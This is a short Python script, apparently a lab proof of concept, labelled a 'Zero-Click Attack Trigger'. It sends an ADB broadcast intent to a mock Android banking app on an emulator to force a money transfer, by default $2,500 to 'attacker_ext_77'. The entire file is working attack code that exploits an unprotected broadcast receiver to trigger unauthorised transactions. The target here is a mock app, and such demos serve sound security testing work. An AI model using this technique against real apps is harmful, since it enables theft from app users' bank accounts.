import subprocess
import argparse

def send_attack_intent(amount, account):
    """
    Sends a broadcast intent to the Android Emulator via ADB.
    This simulates an external trigger for the zero-click behavior.
    """
    print(f"[+] Preparing payload: {amount} to {account}")
    
    # ADB command to send broadcast with extras
    adb_cmd = [
        "adb", "shell", "am", "broadcast",
        "-a", "com.mock.bank.TRIGGER_TRANSFER",
        "--es", "amount", amount,
        "--es", "to_account", account,
        "com.mock.banking"
    ]
    
    try:
        print("[+] Executing ADB command...")
        result = subprocess.run(adb_cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print("[SUCCESS] Intent broadcast successfully.")
            print(f"Output: {result.stdout.strip()}")
        else:
            print("[ERROR] Failed to send intent. Is the emulator running?")
            print(f"Error: {result.stderr}")
    except FileNotFoundError:
        print("[ERROR] ADB not found. Please install Android Platform Tools.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Zero-Click Attack Trigger")
    parser.add_argument("--amount", default="$2,500", help="Amount to transfer")
    parser.add_argument("--to", default="attacker_ext_77", help="Target account")
    
    args = parser.parse_args()
    send_attack_intent(args.amount, args.to)
